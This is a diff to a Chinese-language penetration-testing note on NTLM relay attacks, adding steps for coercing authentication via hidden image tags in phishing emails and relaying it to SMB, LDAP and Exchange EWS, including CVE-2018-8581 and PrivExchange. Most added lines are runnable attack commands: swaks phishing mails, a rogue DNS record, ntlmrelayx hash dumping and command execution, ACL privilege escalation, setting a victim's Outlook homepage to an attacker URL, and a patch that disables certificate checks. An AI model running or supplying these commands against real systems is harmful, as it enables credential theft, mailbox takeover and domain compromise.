@@ -108,7 +108,7 @@ DHCPv6 协议中，客户端通过向组播地址发送 Solicit 报文来定位 
 可以利用 Fox-IT 公开的工具进行攻击
 
 **相关文章**
-- [mitm6 – compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+- [mitm6 - compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
     - [mitm6：通过IPv6攻破IPv4网络](https://www.anquanke.com/post/id/94689)
 
 **mitm6**
@@ -324,10 +324,81 @@ Exchange 的认证也支持 NTLM SSP。我们可以 relay 的 Exchange，从而�
 
 在 outlook 邮件中插入 HTML,触发 UNC
 
+在邮件中插入如下标签：
+```
+<img src="\\192.168.60.172\blank">
+<img src="http://relayubuntu/blank">
+```
+在用户通过 Outlook 打开邮件时：
+
+1. UNC 默认会通过 smb 协议发起 NTLM 认证，但是外网钓鱼的话，目标单位的 smb 流量可能无法出网。
+2. HTTP 默认不会发起 NTLM 认证，即使服务端对其进行 NTLM 挑战，除非服务端 url 位于服务器的信任网站或内联网列表。Windows 会认为 http://Netbios 形式的 url 处于内联网，域内用户默认有增加 DNS 记录的权限，因此攻击者需要先获取域用户权限并创建 DNS 记录来将恶意服务器"放入"内联网列表。显然，这种方法无法用于外网钓鱼。
+
+```bash
+# 发送带 UNC 路径的邮件
+swaks --server 192.168.60.116 --ehlo island.com --to zhangsan@island.com --from test@island.com --header "Subject:relay_swaks_test" --body '<img src="\\192.168.60.172\blank" style="display:none">this is a msg' --h-X-Mailer: 'Foxmail 7.2.20.273[cn]' --add-header "Content-Type: text/html"
+
+# 发送带 HTTP 路径的邮件
+swaks --server 192.168.60.116 --ehlo island.com --to zhangsan@island.com --from test@island.com --header "Subject:relay_swaks_test" --body '<img src="http://relayubuntu/blank" style="display:none">this is a msg' --h-X-Mailer: 'Foxmail 7.2.20.273[cn]' --add-header "Content-Type: text/html"
+# Powermad Invoke-DNSUpdate.ps1
+# 创建 DNS 记录
+Invoke-DNSUpdate -DNSType A -DNSName relayubuntu -DNSData 192.168.60.172
+```
+
 这种 Relay，可以在外网发起 relay，而不需要在内网。
 
 - [Arno0x/NtlmRelayToEWS](https://github.com/Arno0x/NtlmRelayToEWS)
 - [quickbreach/ExchangeRelayX](https://github.com/quickbreach/ExchangeRelayX)
+
+**smb/http relay to smb**
+
+中继至 smb 时，如果：
+
+1. 中继的账户是普通域账户，则无法完成中继。受 Remote UAC 限制，除了以下账户外，其他账户无法网络登录 smb
+2. 中继的账户是域管账户或本地管理员账户，可以完成中继
+```bash
+# 不加参数，默认 dump 目标 hash
+python3 ntlmrelayx.py -t smb://192.168.60.112 -smb2support
+python3 ntlmrelayx.py -t smb://192.168.60.112 -smb2support -socks
+python3 ntlmrelayx.py -t smb://192.168.60.112 -smb2support -c "whoami"
+```
+
+**http relay to ldap**
+
+中继至 ldap 时，如果：
+
+1.中继的账户是普通域账户，会 dump 域内 ldap 信息
+2.中继的账户是高权限域账户，会自动尝试 ACL 提权
+
+需要注意的是，smb relay to ldap 默认情况下会开启签名，因此只能 http relay to ldap。
+```
+python3 ntlmrelayx.py -t ldap://192.168.60.112 -smb2support
+```
+
+**smb/http relay to http**
+
+中继至 http 时，如果：
+
+1. 中继的账户是普通域用户，可以中继到 Exchange /EWS 接口，实现邮件发送、邮件下载、邮件委托、设置主页等功能
+2. 中继的账户是域管账户，可以尝试 AD CS 提权
+
+```bash
+python2 ntlmRelayToEWS.py -t https://ip/EWS/exchange.asmx -r getFolder -f inbox -v
+python2 ntlmRelayToEWS.py -t https://ip/EWS/exchange.asmx -r setHomePage -u http://evil/home.html -v
+
+# 如果报证书认证错误，需要修改 lib/httprelayclient.py 源码
+class HTTPRelayClient:
+    def __init__(self, target, body):
+        ......
+        ......
+        if proto.lower() == 'https':
+            #Create unverified (insecure) context
+            try:
+                #uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+                # uv_context = ssl.create_default_context()
+                uv_context = ssl._create_unverified_context() # 把 create_default_context 改成 _create_unverified_context
+实战中邮件委托和设置主页两个功能危害较大。
+```
 
 #### CVE-2018-8581
 
@@ -338,20 +409,40 @@ Exchange 的认证也支持 NTLM SSP。我们可以 relay 的 Exchange，从而�
 **相关文章**
 - [Exchange CVE-2018-8581 补丁有用？没用？](https://mp.weixin.qq.com/s/5nPUhIpUB5sR2bmP_getyw)
 
-**relay 到 EWS 接口**
+**http relay to EWS 接口**
 
 由于 Exchange 是以 System 用户的权限运行, 因此我们拿到的是机器用户的 Net-Ntlm Hash。并不能直接用以登录。但是 Exchange 机器用户可以获得 TokenSerializationRight 的 ”特权” 会话，可以 Relay 到 机子本身的 Ews 接口，然后可以使用 SOAP 请求头来冒充任何用户。
 - https://github.com/WyAtu/CVE-2018-8581
 
-**relay 到 LDAP**
+本地 NT AUTHORITY\SYSTEM 账户对 Exchange 服务器拥有 ms-Exch-EPI-Token-Serialization 权限，可以在连接 /EWS 接口时修改 SOAP Header 为其他邮箱用户的 SID 来模拟成任何邮箱用户。因此可以中继至 /EWS 接口，实现任意用户的邮件发送、邮件下载、邮件委托、设置主页等功能。
+```bash
+# 查看本地 NT AUTHORITY\SYSTEM 账户对 Exchange 服务器拥有 ms-Exch-EPI-Token-Serialization 权限
+PS C:\> Get-ADPermission -Identity WIN2012-Ex2016 | where {($_.ExtendedRights -like "ms-Exch-EPI-Token-Serialization") -and $_.Deny -like "False"} |fl
+
+# 手动修改 CVE-2018-8581_debug.py 参数后执行
+python2 CVE-2018-8581_debug.py
+
+# 然后 zhangsan 可以打卡 lisi 的收件箱文件夹查看其邮件。
+```
+
+**http relay to LDAP**
 
 所有的 Exchange Server 都在 Exchange Windows Permissions 组里面, 而这个组默认就对域有 WriteACL 权限.
 
 因此我们可以 relay 到 LDAP, 而又由于 Relay 到的服务端是 Ldap,Ldap 服务器的默认策略是协商签名。而不是强制签名。是否签名由客户端决定。在 SSRF 里面发起的请求是 http 协议，http 协议是不要求进行签名.
 
+Exchange 机器账户对域分区拥有 WriteDacl 权限，直接通过 ACL 进行提权。
+```bash
+# 设定订阅
+python3 privexchange.py win2012-ex2016.island.com -d island.com -ah 192.168.123.123 -u zhangsan -p ZS@123qwe --debug
+
+# 内网机器上做中继，自动通过 ACL 进行提权
+python3 ntlmrelayx.py -t ldap://WIN2012-DC1.island.com --escalate-user zhangsan --no-dump
+```
+
 ---
 
-### LDAP 中继
+### LDAP中继
 
 #### LDAP签名
 
